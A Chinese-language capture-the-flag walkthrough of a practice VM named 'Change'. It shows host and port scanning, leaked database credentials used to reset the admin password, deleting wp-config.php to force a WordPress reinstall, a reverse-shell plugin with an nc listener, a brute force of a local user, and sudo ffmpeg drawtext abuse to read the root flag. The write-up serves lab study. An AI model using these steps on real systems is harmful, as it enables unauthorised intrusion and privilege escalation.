

![image](https://7r1UMPHK.github.io/image/20250721221556384.webp)

# 一、信息收集

# 1. 主机发现

首先，在内网环境中使用 `arp-scan` 工具扫描本地网络，以发现存活的主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.202 08:00:27:7d:c4:83       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fc:a8:ce       VMware, Inc.
...
```

扫描结果显示目标主机的 IP 地址为 `192.168.205.202`。

## 2. 端口与服务扫描

确定目标 IP 后，使用 `nmap` 对其进行详细的端口扫描，探测其开放的端口和服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.202
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 10:13 EDT
Nmap scan report for 192.168.205.202
Host is up (0.00010s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 08:00:27:7D:C4:83 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds```

扫描发现目标开放了三个服务端口：SSH (22), HTTP (80) 和 MySQL (3306)。
```

# 二、初始访问

## 1. Web 应用枚举

访问 80 端口的 Web 服务，页面提示我们访问域名 `change.dsz`。我们将该域名与目标 IP 的映射关系添加到本地 `/etc/hosts` 文件中。

使用 `wfuzz` 对子域名进行模糊测试，发现了一个新的子域名 `wordpress.change.dsz`。


接着使用 `gobuster` 对 `http://change.dsz` 进行目录扫描，发现 `login.php`, `admin.php`, `db.php` 等文件。

## 2. 信息泄露与数据库访问

在 `login.php` 页面的 HTML 源码中，发现了一段注释，泄露了数据库的连接凭据。

```html
<!-- Database connection settings:
Host=localhost, DB=changeweb
User=change, Password=change -->
```

我们使用这组凭据 (`change:change`) 成功连接到目标的 MySQL 服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ mysql -h 192.168.205.202 -u change -pchange --skip-ssl
Welcome to the MariaDB monitor. ...
...
MariaDB [changeweb]> select * from users;
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
|  1 | root     | $2y$10$EFCK8LdjkDv1W52q0bV8.OLUicO8h6kYBqU5nE1jOcSq3qQ9l5mZG |
+----+----------+--------------------------------------------------------------+
```

在 `changeweb` 数据库的 `users` 表中，我们发现了 `root` 用户的密码哈希。

## 3. 获取立足点

通过 `SHOW GRANTS` 命令查询可知，`change` 用户拥有对 `changeweb` 数据库的全部权限，这意味着我们可以修改表中的数据。我们本地生成一个新的密码哈希（密码为 `1`），并更新 `users` 表中的 `root` 用户密码。

```bash
# 在攻击机上生成密码哈希
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ php -r 'echo password_hash("1", PASSWORD_DEFAULT);'
$2y$12$l22u4aCvdoTp.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG

# 在数据库中更新密码
MariaDB [changeweb]> UPDATE users SET password = '$2y$12$l22u4aCvdoTp.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG' WHERE username = 'root';
```

使用 `root:1` 成功登录后台 `admin.php`，发现这是一个命令执行页面，但功能受限，只允许执行 `ls`, `rm`, `pwd` 等少数命令。

我们的目标是 `wordpress.change.dsz`。利用已知漏洞，如果 WordPress 的 `wp-config.php` 文件被删除，再次访问网站会触发重新安装流程。利用 `admin.php` 的 `rm` 命令执行权限，我们删除了该配置文件。

```bash
# 在 admin.php 页面执行
rm ../wordpress.change.dsz/wp-config.php
```

刷新 `http://wordpress.change.dsz/`，果然进入了 WordPress 的安装界面。我们利用已掌握的 `changeweb` 数据库凭据完成了安装，并设置了一个新的管理员账户。

登录 WordPress 后台后，我们上传并激活了一个包含反向 Shell 的恶意插件，成功在本地 `nc` 监听器上接收到了一个 `www-data` 用户的 Shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.202] 47432
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 三、权限提升

## 1. 提权至 `lzh` 用户

在 `www-data` 的 Shell 中，我们在 `/home/lzh/` 目录下发现了一个名为 `.pass.txt` 的密码字典文件和一个 `user.txt`。

我们将密码爆破工具 `suForce` 上传到目标服务器的 `/tmp` 目录，并使用 `.pass.txt` 作为字典，对本地用户 `lzh` 进行密码爆破。

```bash
www-data@Change:/tmp$ ./suForce -u lzh -w /home/lzh/.pass.txt
...
💥 Password | 1a2b3c4d1a2b3c4d
...
```

成功破解出 `lzh` 用户的密码为 `1a2b3c4d1a2b3c4d`。我们使用该凭据通过 SSH 登录，获得了 `lzh` 用户的 Shell，并读取了第一个 flag。

```bash
lzh@Change:~$ cat user.txt
flag{user-a05597ed1f36976e88c2e10a74902c52}
```

## 2. 提权至 `root`

成为 `lzh` 用户后，我们检查其 `sudo` 权限。

```bash
lzh@Change:~$ sudo -l
...
User lzh may run the following commands on Change:
    (ALL) NOPASSWD: /usr/bin/ffmpeg
```

结果显示，`lzh` 用户可以无需密码以 `root` 权限执行 `/usr/bin/ffmpeg` 命令。`ffmpeg` 是一个功能强大的多媒体处理工具，其 `drawtext` 滤镜可以读取指定文件的内容并将其渲染到视频或图片上。我们可以利用此特性读取任意文件。

我们构造 `ffmpeg` 命令，将 `/root/root.txt` 的内容作为文本，绘制到一个新的图片文件 `/tmp/flag.png` 中。

```bash
lzh@Change:/tmp$ sudo /usr/bin/ffmpeg -f lavfi -i "nullsrc" -vf "drawtext=fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf:textfile=/root/root.txt:fontsize=24:fontcolor=white" -frames:v 1 /tmp/flag.png
```

命令成功执行后，在 `/tmp` 目录下生成了 `flag.png`。我们在该目录下开启一个临时的 Python HTTP 服务器。

```bash
lzh@Change:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

最后，在我们的攻击机上通过浏览器访问 `http://192.168.205.202:8000/flag.png`，图片上清晰地显示了 `root` flag 的内容。

![image](https://7r1UMPHK.github.io/image/20250721225001229.webp)

# 四、获取所有 Flag

至此，我们成功获取了系统上的所有 flag。